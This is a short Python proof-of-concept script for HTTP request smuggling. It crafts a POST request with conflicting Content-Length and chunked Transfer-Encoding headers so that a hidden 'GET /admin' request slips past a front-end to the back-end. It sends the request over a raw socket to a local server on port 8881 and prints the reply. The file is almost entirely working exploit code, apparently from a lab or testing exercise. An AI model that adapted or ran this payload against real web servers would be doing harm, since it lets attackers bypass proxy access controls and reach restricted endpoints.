# poc_smuggler.py
import socket

def generate_and_send_payload():
    # The request we want to smuggle to the back-end
    smuggled_req = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
    
    # The chunk terminator is exactly 5 bytes: '0', '\r', '\n', '\r', '\n'
    chunk_terminator = b"0\r\n\r\n"
    
    # Content-Length should ONLY cover the chunk terminator
    content_length = len(chunk_terminator) 
    
    headers = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost:8881\r\n"
        b"Content-Length: " + str(content_length).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
    )
    
    body = chunk_terminator + smuggled_req
    full_payload = headers + body
    
    print("[*] Sending Payload...")
    print("-" * 50)
    print(full_payload.decode('utf-8', errors='ignore'))
    print("-" * 50)
    print(f"[*] Total Content-Length set to: {content_length}")
    print(f"[*] Actual body size: {len(body)}")
    print(f"[*] Smuggled request size: {len(smuggled_req)}\n")

    # Send over raw TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8881))
    s.sendall(full_payload)
    
    # Receive responses (we might get two if the server pipelines them, or just one)
    response = s.recv(4096)
    print("[*] Server Response:")
    print(response.decode('utf-8', errors='ignore'))
    s.close()

if __name__ == "__main__":
    generate_and_send_payload()